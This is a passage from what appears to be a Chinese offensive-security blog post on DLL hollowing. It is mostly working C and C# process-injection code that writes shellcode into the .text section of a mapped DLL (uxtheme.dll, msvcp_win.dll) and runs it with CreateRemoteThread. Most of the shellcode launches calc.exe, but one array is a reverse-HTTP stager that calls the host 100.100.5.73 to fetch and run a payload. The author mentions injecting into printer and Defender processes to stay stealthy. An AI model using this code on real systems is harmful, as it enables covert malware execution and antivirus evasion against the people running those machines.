UniqueThread; } CLIENT_ID, *  PCLIENT_ID;typedef enum _SECTION_INHERIT{    ViewShare = 1,    ViewUnmap = 2} SECTION_INHERIT, * PSECTION_INHERIT;using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG   DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER   MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE   FileHandle OPTIONAL);using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle,  PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,  PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN   PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG   StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID   StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID   ClientID);myNtCreateSection fNtCreateSection =  (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));myNtMapViewOfSection fNtMapViewOfSection =  (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));myRtlCreateUserThread fRtlCreateUserThread =  (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;PVOID map_dll_image(HANDLE hSection, HANDLE hProcess, DWORD protect) //传入文件映射对象、进程句柄、页面可读可写权限{    NTSTATUS                  status;    PVOID                             sectionBaseAddress;    SIZE_T                            viewSize;    SECTION_INHERIT           inheritDisposition;    if (hProcess == NULL)        return NULL;    // NtMapViewOfSection always fail when you specify a desired base address    sectionBaseAddress = NULL;    viewSize = 0;    inheritDisposition = ViewShare;    status = fNtMapViewOfSection((HANDLE)hSection, //文件映射对象        (HANDLE)hProcess, //进程句柄        (PVOID*)&amp;sectionBaseAddress, //接收返回基址        (ULONG_PTR)NULL,        (SIZE_T)NULL,        (PLARGE_INTEGER)NULL,        &amp;viewSize, //从SectionOffset开始并继续到该部分末尾的部分的视图范围+1        inheritDisposition,        (ULONG)PtrToUlong(NULL),        (ULONG)protect); //页面权限修改    if (!NT_SUCCESS(status)) {        printf(&quot;NtMapViewOfSection: 0x%x\n&quot;, status);        return NULL;    }    return sectionBaseAddress; //返回修改后的基址}int main(){    HANDLE hSection = NULL;    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;    SIZE_T size = 4096;    INT PID = 24552;    LARGE_INTEGER sectionSize = { size };    TCHAR moduleName[] = L&quot;C:\\Windows\\System32\\xwreg.dll&quot;;    HMODULE hmodules[MAX_PATH] = {};    DWORD hmodulesize = sizeof(hmodules);    DWORD hmodulesizeneeded = 0;    HANDLE hFile = NULL;    NTSTATUS status = 0;    DWORD protect = 0x0;    BYTE* mapped = NULL;    hFile = CreateFileW(moduleName, GENERIC_READ, 0, NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL, NULL);    status = fNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY,  SEC_IMAGE, hFile);    if (!NT_SUCCESS(status)) {        printf(&quot;NtCreateSection: 0x%x\n&quot;, status);        CloseHandle(hFile);        return NULL;    }    printf(&quot;Section created - hSection = 0x%x\n&quot;, hSection);    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);    if (hprocess == NULL) {        errorprint(&quot;OpenProcess&quot;);    }    protect = PAGE_READWRITE;    mapped = (BYTE*)map_dll_image(hSection, hprocess, protect);    if (mapped == NULL) {        CloseHandle(hSection);        CloseHandle(hFile);        return NULL;    }    printf(&quot;Load DLL:%s 0x%x\n&quot;, moduleName, mapped);    DWORD headerbuffersize = 0x1000;    LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerbuffersize);    ReadProcessMemory(hprocess, mapped, peHeader, headerbuffersize, NULL); //读取dll pe地址    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)peHeader; //dll DOS头    PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader +  dosheader-&gt;e_lfanew); //dll BaseAddress+文件相对偏移地址=ntaddress    LPVOID dllEntryPoint = (LPVOID)(ntheader-&gt;OptionalHeader.AddressOfEntryPoint +  (DWORD_PTR)mapped); //入口点指针地址+指定dll基地址=模块入口点    WriteProcessMemory(hprocess, dllEntryPoint, (LPVOID)buf, sizeof(buf), NULL); //写入shellcode    CreateRemoteThread(hprocess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0,  NULL); //远程线程启动    return 0;}</code></pre><p>NtMapViewOfSection加载DLL:<br><img src="https://s4.ax1x.com/2022/01/16/7YIvVA.png" alt=""></p><p>执行结果如下：<br><img src="https://s4.ax1x.com/2022/01/16/7YIz5t.png" alt=""></p><p>也可以按照文章里的，获取到DLL后。直接申请权限可读、可写然后写入shellcode在远程线程调用。不过改来改去太敏感了<br><img src="https://s4.ax1x.com/2022/01/16/7YopPP.png" alt=""></p><p>该文章的POC思路如下：</p><pre><code>1. 获取系统根目录2. 搜索根目录里的DLL3.判断DLL的PE大小是否小于shellcode大小    1. 如果小于则返回该DLL的路径4. 检测是否要绕过CFG （Win10 执行流保护）5. NtMapViewOfSection加载DLL6. 更改权限写入shellcode7. 远程线程调用</code></pre><p>参考链接:<br><a href="https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/" target="_blank" rel="noopener">https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/</a><br><a href="https://github.com/SECFORCE/DLL-Hollow-PoC" target="_blank" rel="noopener">https://github.com/SECFORCE/DLL-Hollow-PoC</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection</a></p><h2 id="DLL-txt区段插入shellcode用CreateRemoteThread调用"><a href="#DLL-txt区段插入shellcode用CreateRemoteThread调用" class="headerlink" title="DLL .txt区段插入shellcode用CreateRemoteThread调用"></a>DLL .txt区段插入shellcode用CreateRemoteThread调用</h2><p>注意事项：</p><pre><code>* x64只能注x64的进程，x86只能插x86的进程。对应进程位数带有下面的两个dll，需要根据位数来注入</code></pre><p>最近两天有更简单粗暴的方法，找一个DLL .txt区段插入shellcode用CreateRemoteThread调用。进程不会崩溃的<br>原文链接:<a href="https://www.netero1010-securitylab.com/eavsion/alternative-process-injection" target="_blank" rel="noopener">https://www.netero1010-securitylab.com/eavsion/alternative-process-injection</a><br>测试了一下win10稳定加载shellcode 进程不会崩溃的两个DLL</p><pre><code>* uxtheme.dll* msvcp_win.dll</code></pre><p>csharp</p><pre><code class="cshap">using System;using System.Diagnostics;using System.Runtime.InteropServices;namespace AnotherDLLHollowing{    class Program    {        [DllImport(&quot;kernel32.dll&quot;)]        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);        [DllImport(&quot;kernel32.dll&quot;)]        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);        [DllImport(&quot;kernel32.dll&quot;)]        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);        static void Main(string[] args)        {            int pid = Process.GetProcessesByName(&quot;notepad&quot;)[0].Id;byte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };            Process processObj = Process.GetProcessById(pid);            foreach (ProcessModule module in processObj.Modules)            {                if (module.FileName.ToLower().Contains(&quot;gdi32full.dll&quot;))                {                    IntPtr addr = module.BaseAddress + 4096;                    Console.WriteLine(&quot;DLL BaseAddress:&quot;+addr);                    IntPtr outSize;                    uint oldProtect;                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);                    WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x20, out oldProtect);                    IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);                    break;                }            }        }    }}</code></pre><p>C<br>示例代码:</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;unsigned char buf[] =  &quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x41\x55\x53\x74\x00\x50\x3b\xee\xb2\x1e\xaf\x7b\x8f\xea\x2c\xc7\x03\x8a\xe7\x01\x52\x2d\x36\x42\x10\xdd\x4f\xd5\x10\x29\x0a\x34\x71\x55\x7a\x57\x16\x7b\x4e\xf0\x72\x78\xf7\x03\x64\xcd\x76\x26\x3d\x72\x2c\x3b\x61\x37\x22\xba\x56\xd9\x08\xa9\xf1\x4b\x07\xea\xf3\xd3\x37\xc7\x2e\x72\x78\x95\xa6\x04\x84\xd9\xf2\xa7\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4e\x50\x30\x38\x3b\x20\x4d\x41\x41\x55\x3b\x20\x4e\x50\x30\x38\x29\x0d\x0a\x00\x1e\x20\xa6\xba\x38\x5d\xf2\x48\xf5\x8a\xd0\xe1\x67\x11\x2c\x89\x1e\x13\x84\xfd\x3b\x1b\x2a\x76\xcc\xe3\x06\x10\xdb\xcb\x91\x3a\xbe\x47\xce\x62\xb6\x30\x67\x3a\x1a\x4d\xcb\x60\x6b\x61\x47\x54\x5f\x23\x37\x02\xda\xd6\x4c\x64\xb5\x28\x25\xc9\x15\x17\x78\x86\x24\x71\xdb\xf0\x39\x02\xdf\xcc\x96\xd6\x0a\x28\xb0\xe8\xea\x5c\xa2\x21\xe4\xb9\x01\x98\xf7\x53\x52\x2c\xe3\x6f\x0e\x94\xf9\x6b\x81\x19\x67\xd4\x1a\x0d\xa8\x9b\xe5\x08\x1c\x3d\x14\xe1\x78\x91\xa6\xa4\x4b\x7b\x55\x4e\x8e\x44\xb6\x2c\xe2\xce\x6f\x23\x66\x09\x1b\x78\xb5\xe0\xec\x35\x28\xd0\x27\x6c\xde\xf1\xd3\xb5\xbd\xb3\xe8\x23\x7e\x0f\x69\xa2\x57\x57\x7d\x8c\x2f\xb3\x32\x45\x84\x2a\x6a\x2d\xde\xa0\xdd\xc0\x8a\x78\x36\x20\xbb\xa5\x35\xc4\x19\x2a\x03\x66\x25\xc7\xc0\xdd\xc8\x53\x37\x97\x6d\xb4\x8a\x30\xba\xad\xfe\x09\xe6\xbf\xae\x80\x7c\xdb\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x30\x2e\x31\x30\x30\x2e\x35\x2e\x37\x33\x00\x00\x08\xc3\x27&quot;;int PrintModules(HANDLE hProcess, DWORD processID){        printf(&quot;inject PID:%d\n&quot;,processID);        CHAR targetdll[] = &quot;uxtheme.dll&quot;;        CHAR dllname[1024] = { 0 };        DWORD oldProtect;        MODULEENTRY32 moduleEntry;        HANDLE handle = NULL;        handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID); //  获取进程快照中包含在th32ProcessID中指定的进程的所有的模块。        if (!handle) {               CloseHandle(handle);               return NULL;        }        ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32));        moduleEntry.dwSize = sizeof(MODULEENTRY32);        if (!Module32First(handle, &amp;moduleEntry)) {               CloseHandle(handle);               return NULL;        }        do {               sprintf(dllname, &quot;%ws&quot;, moduleEntry.szModule);        //      printf(&quot;%s\n&quot;, dllname);               if (strcmp(dllname, targetdll) == 0) {                       printf(&quot;find DLL:%s\n&quot;,targetdll);                       BYTE *Address = moduleEntry.modBaseAddr + 4096;                       printf(&quot;DLL Address:0x%x\n&quot;,Address);                       VirtualProtectEx(hProcess, Address, sizeof(buf), 0x04,  &amp;oldProtect);                       WriteProcessMemory(hProcess, Address, buf, sizeof(buf), NULL);                       VirtualProtectEx(hProcess, Address, sizeof(buf), 0x20,  &amp;oldProtect);                       CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);                       printf(&quot;[+] inject shellcode sucess\n&quot;);               }        } while (Module32Next(handle, &amp;moduleEntry));        CloseHandle(handle);        return 0;}int main(){        char targetname[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;        STARTUPINFOA si = { 0 };        PROCESS_INFORMATION pi = { 0 };        bool ct=CreateProcessA(targetname, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,  NULL, NULL, &amp;si, &amp;pi);        if (ct == false) {               printf(&quot;CreateProcess Fuck Error Code:%d\n&quot;,GetLastError());               exit(0);        }        Sleep(2000);        PrintModules(pi.hProcess,pi.dwProcessId);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YoFKg.png" alt=""></p><p>uxtheme.dll和msvcp_win.dll win10基本每个进程都加载了<br><img src="https://s4.ax1x.com/2022/01/16/7YoYI1.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YoUG6.png" alt=""></p><p>插打印机和Defender都行<br><img src="https://s4.ax1x.com/2022/01/16/7Yo2JP.png" alt=""></p><p>寻找稳定DLL（适用于win10）</p><pre><code class="c">// demoinject.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;winnt.h&gt;#include &lt;map&gt;#include &lt;iostream&gt;using namespace std;map &lt;string, int&gt; dlllist;map&lt;string, int&gt;::iterator iter;unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;char taskname[] = &quot;Calculator.exe&quot;;#define ErrorPrint(text,code){printf(&quot;Error:%s ErrorCode:%d\n&quot;,text,code);}int IsExistProcess(CONST CHAR* szProcessName){        PROCESSENTRY32 processEntry32;        char pname[1024] = { 0 };        HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (((int)toolHelp32Snapshot) != -1)        {               processEntry32.dwSize = sizeof(processEntry32);               if (Process32First(toolHelp32Snapshot, &amp;processEntry32))               {                       do                       {                              sprintf(pname, &quot;%ws&quot;, processEntry32.szExeFile);                              if (strcmp(szProcessName, pname) == 0)                              {                                      return processEntry32.th32ProcessID;                              }                       } while (Process32Next(toolHelp32Snapshot, &amp;processEntry32));               }               CloseHandle(toolHelp32Snapshot);        }        return FALSE;}int PrintModules(HANDLE hProcess,DWORD processID){        int id = 0;        CHAR currnetname[1024] = {0};        CHAR dllname[1024] = {0};        DWORD oldProtect;        MODULEENTRY32 moduleEntry;        HANDLE handle = NULL;        handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID); //  获取进程快照中包含在th32ProcessID中指定的进程的所有的模块。        if (!handle) {               CloseHandle(handle);               return NULL;        }        ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32));        moduleEntry.dwSize = sizeof(MODULEENTRY32);        if (!Module32First(handle, &amp;moduleEntry)) {               CloseHandle(handle);               return NULL;        }        do {               sprintf(dllname, &quot;%ws&quot;, moduleEntry.szModule);               if (id == 0) {                       sprintf(currnetname, &quot;%s&quot;, dllname);               }               id += 1;               if (strcmp(dllname, currnetname) != 0) {                       if (dlllist.find(dllname) == dlllist.end()) {                              //             printf(&quot;%s 0x%x\n&quot;,dllname,  moduleEntry.hModule);                              BYTE *Address = moduleEntry.modBaseAddr + 4096;                              VirtualProtectEx(hProcess, Address, sizeof(buf), 0x04,  &amp;oldProtect);                              WriteProcessMemory(hProcess, Address, buf, sizeof(buf),  NULL);                              VirtualProtectEx(hProcess, Address, sizeof(buf), 0x20,  &amp;oldProtect);                              CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);                              MEMORY_BASIC_INFORMATION baseinfo;                              VirtualQueryEx(hProcess, Address, &amp;baseinfo,  sizeof(baseinfo));                              Sleep(5000);                              int currentpid = IsExistProcess(currnetname);                              //printf(&quot;the pid:%d %d\n&quot;, processID, currentpid);                              if (dlllist.find(dllname) == dlllist.end()) {                                      int kpid = IsExistProcess(taskname);                                      if (kpid) {                                             dlllist.insert(pair &lt;string, int &gt;(dllname,  true));                                             printf(&quot;found DLL run shellcode ok:%s,but dll  is GG?\n&quot;, dllname);                                             HANDLE  kHprocess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, kpid);                                             TerminateProcess(kHprocess, 0);                                             Sleep(2000);                                             //return TRUE;                                             if (currentpid == processID) {                                                     printf(&quot;Found valid candidate:%s,  region size available on the .text section: 0x%x\n&quot;, dllname, baseinfo.RegionSize);                                                     return TRUE;                                             }                                             else {                                                     printf(&quot;Fuck DLL:%s\n&quot;, dllname);                                                     dlllist.insert(pair &lt;string, int  &gt;(dllname, false));                                                     return FALSE;                                             }                                      }else {                                             printf(&quot;Fuck DLL:%s\n&quot;, dllname);                                             dlllist.insert(pair &lt;string, int &gt;(dllname,  false));                                             return FALSE;                                      }                              }                       }               }        } while (Module32Next(handle, &amp;moduleEntry));        CloseHandle(handle);        return 0;        /*        HANDLE hProcess;        DWORD cbNeeded;        HMODULE hmodules[MAX_PATH] = {};        DWORD hmodulesize = sizeof(hmodules);        DWORD hmodulesizeneeded = 0;        HMODULE rmodule = NULL;        CHAR rmoduleName[MAX_PATH] = {};        unsigned int i;        printf(&quot;Process ID: %u\n&quot;, processID);        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,  processID);        if (NULL == hProcess) {               ErrorPrint(&quot;Rows:20 OpenProcess&quot;, GetLastError());        }        printf(&quot;\nOpenProcess:0x%x\n&quot;,hProcess);        bool MeiJu=EnumProcessModules(hProcess, hmodules, hmodulesize,  &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量        if (MeiJu != true) {               ErrorPrint(&quot;Rows:24 EnumProcessModules&quot;, GetLastError());        }        printf(&quot;\nModuleCount:%d\n&quot;,(hmodulesizeneeded / sizeof(HMODULE)));        for (int calc = 0;calc &lt; (hmodulesizeneeded / sizeof(HMODULE));calc++) {               rmodule = hmodules[calc];               GetModuleFileNameExA(hProcess, rmodule, rmoduleName, sizeof(rmoduleName));  //获取模块名称               HMODULE  BaseAddress = GetModuleHandleA((LPCSTR)rmoduleName)+4096; //DLL加载起始地址               if (BaseAddress == NULL) {                       ErrorPrint(&quot;Rows:32 GetModuleBaseNameA&quot;,GetLastError());               }               printf(&quot;%s BaseAddress:0x%x\n&quot;, rmoduleName, BaseAddress);        }        CloseHandle(hProcess);        return 0;        */}int main(){        bool Ctprocess;        STARTUPINFOA si = { 0 };        PROCESS_INFORMATION pi = { 0 };        si.cb = sizeof(si);        char processname[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;        